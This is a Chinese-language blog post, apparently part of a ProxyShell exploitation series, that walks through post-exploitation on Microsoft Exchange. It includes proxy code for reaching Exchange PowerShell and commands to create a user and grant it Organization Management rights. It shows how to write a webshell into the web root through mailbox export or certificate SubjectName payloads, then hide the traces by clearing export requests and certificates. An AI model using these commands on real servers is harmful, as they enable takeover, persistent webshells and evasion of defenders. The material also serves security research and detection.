---
layout: post
title: ProxyShell利用分析3——添加用户和文件写入
---


## 0x00 前言
---

本文将要介绍ProxyShell中添加用户和文件写入的细节，分析利用思路。

## 0x01 简介
---

本文将要介绍以下内容：

- 添加用户的方法
- 文件写入的方法
- 利用分析

## 0x02 添加用户的方法
---

使用[PyPSRP](https://github.com/jborean93/pypsrp)执行Powershell命令时，无法执行添加用户的操作

这是因为传递Password的值时需要执行Powershell命令`convertto-securestring`，而`convertto-securestring`不是Exchange PowerShell Remoting支持的命令

解决方法可以参考Orange的思路，通过调用本地Powershell，最终实现添加用户

参考资料：

https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell

需要注意以下细节：

### 1.通过Flask建立本地代理服务器

代码可参考：

https://gist.githubusercontent.com/zdi-team/087026b241df18102db699fe4a3d9282/raw/ab4e1ecb6e0234c2e319bc229c71f2f4f70b55d9/P2O-Vancouver-2021-ProxyShell-snippet-7.py

在Python3环境下，需要将`request.headers.iteritems()`修改为`request.headers.items()`

如果遇到负载均衡，可以对返回状态码进行判断，如果返回状态码不是200，重新发送数据包

Line28-Line34可以替换成以下代码：

```
    while True:
        r = requests.post(powershell_url, data=data, headers=req_headers, verify=False)    
        if r.status_code == 200:
            print("[+]" + r.headers["X-CalculatedBETarget"])
            break
        else:    
            print("[-]" + r.headers["X-CalculatedBETarget"])  
    req_headers = {}
    for k, v in r.headers.items(): 
        if k in ['Content-Encoding', 'Content-Length', 'Transfer-Encoding']: 
            continue 
        req_headers[k] = v 
 
    return r.content, r.status_code, req_headers
```


### 2.调用本地Powershell

命令可参考：

https://gist.githubusercontent.com/zdi-team/a2eb014d248e4e54a2ab4ba4ae3ac3cf/raw/af251aefc37a47489f43128832798a210393013a/P2O-Vancouver-2021-ProxyShell-snippet-8.ps1

在调用本地Powershell命令前，系统需要做以下设置：

#### (1)设置网络位置

不能选择Public network，需要Home network或者Work network

#### (2)设置管理员用户的密码

确保管理员用户设置了密码

#### (3)开启winrm服务

```
winrm quickconfig 
```

#### (4)修改allowunencrypted属性

Powershell命令如下：

```
cd WSMan:\localhost\Client
set-item .\allowunencrypted $true
dir
```

#### (5)设置TrustedHosts

Powershell命令如下：

```
Get-Item WSMan:\localhost\Client\TrustedHosts
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*'
```

以上设置完成后，能够建立PowerShell会话并执行Exchange PowerShell命令

添加用户的操作需要传入securestring，这里可以使用`-ArgumentList`参数传入

添加用户的命令示例：

```
$pwd=convertto-securestring Password123 -asplaintext -force;
$command = {New-Mailbox -UserPrincipalName testuser1@test.com -OrganizationalUnit test.com/Users -Alias testuser1 -Name testuser1 -DisplayName testuser1 -Password $args[0];}
Invoke-Command -Session $session -ScriptBlock $command -ArgumentList $pwd
```

添加管理员用户的命令示例：

```
$command = {Add-RoleGroupMember "Organization Management" -Member testuser1 -BypassSecurityGroupManagerCheck}
Invoke-Command -Session $session -ScriptBlock $command
```

## 0x03 文件写入的方法
---

### 1.通过New-MailboxExportRequest写入文件

New-MailboxExportRequest用于导出邮件，相关用法可以参考之前的文章[《渗透基础——从Exchange服务器上搜索和导出邮件》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8EExchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%9C%E7%B4%A2%E5%92%8C%E5%AF%BC%E5%87%BA%E9%82%AE%E4%BB%B6)

在写入文件时，需要注意以下问题：

#### (1)用户需要添加到角色组"Mailbox Import Export"中

添加用户到角色组"Mailbox Import Export"的命令示例：

```
New-ManagementRoleAssignment –Role "Mailbox Import Export" –User Administrator
```

移除用户的命令示例：

```
Remove-ManagementRoleAssignment -Identity "Mailbox Import Export-Administrator" -Confirm:$false
```

查看角色组"Mailbox Import Export"中用户的命令示例：

```
Get-ManagementRoleAssignment –Role "Mailbox Import Export"|fl user
```

#### (2)通过邮件传递Payload

这里有以下两种方法：

1.从外部邮箱向目标邮箱发送带有Payload的邮件
2.利用CVE-2021-34473模拟任意邮箱用户，将带有Payload的邮件保存至指定文件夹

对于方法2，为了提高隐蔽性，在保存带有Payload的邮件时可以先创建隐藏文件夹再进行保存，详情可参考之前的文章[《渗透基础——Exchange用户邮箱中的隐藏文件夹》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Exchange%E7%94%A8%E6%88%B7%E9%82%AE%E7%AE%B1%E4%B8%AD%E7%9A%84%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%A4%B9)

#### (3)写入文件

为了能够精确的写入Payload，避免意外错误，在写入邮件时需要加入限定条件，只导出带有Payload的邮件

导出邮件的命令示例：

```
New-MailboxexportRequest -mailbox "test1" -ContentFilter {(body -like "payload Flag")} -FilePath ("\\127.0.0.1\c$\inetpub\wwwroot\aspnet_client\test.aspx")
```

#### (4)清除导出请求

在执行命令New-MailboxexportRequest进行导出时，会自动保存导出请求的记录，默认为30天

如果不想保存导出请求，可以加上参数`-CompletedRequestAgeLimit 0`

**补充：关于导出请求的相关操作**

查看邮件导出请求：

```
Get-MailboxExportRequest
```

删除具体的某个导出请求：

```
Remove-MailboxExportRequest -RequestQueue "Mailbox Database 1111111111" -RequestGuid 11111111-1111-1111-1111-111111111111 -Confirm:$false
Remove-MailboxExportRequest -Identity 'test.com/Users/test1\MailboxExport' -Confirm:$false
```

**注：**

匹配的参数从`Get-MailboxExportRequest|fl`的结果中获得

删除所有导出请求：

```
Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false
```

### 2.通过New-ExchangeCertificate写入文件

New-ExchangeCertificate用于创建和续订自签名证书

最早的公开利用方法在cve-2020-17083中，参考资料：

https://srcincite.io/pocs/cve-2020-17083.ps1.txt

#### (1)传递Payload

通过参数SubjectName传入Payload，需要符合特定的语法，参考资料：

https://docs.microsoft.com/zh-cn/powershell/module/exchange/new-exchangecertificate?view=exchange-ps

简要的说，需要注意以下问题：

- 可以使用固定格式： CN=Payload
- 不能包含这三个特殊字符： , + ;

如果选择Jscript作为Payload，可以先将代码进行Base64编码来避免特殊字符

写入时，如果返回内容为Microsoft.Exchange.Data.BinaryFileDataObject，代表写入成功

#### (2)清除证书

读取所有证书的命令示例：

```
Get-ExchangeCertificate
```

匹配指定特征证书的命令示例：

```
Get-ExchangeCertificate | Where-Object -Property Subject -like 'CN="<%@*'
```

删除指定证书的命令示例：

```
Remove-ExchangeCertificate -Thumbprint 1111111111111111111111111111111111111111 -Confirm:$false
Get-ExchangeCertificate | Where-Object -Property Subject -like 'CN="<%@*' |Remove-ExchangeCertificate -Confirm:$false
```

## 0x04 小结
---

在ProxyShell的研究过程中，我产生了很多新的想法，未来会在合适的机会进行分享。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)








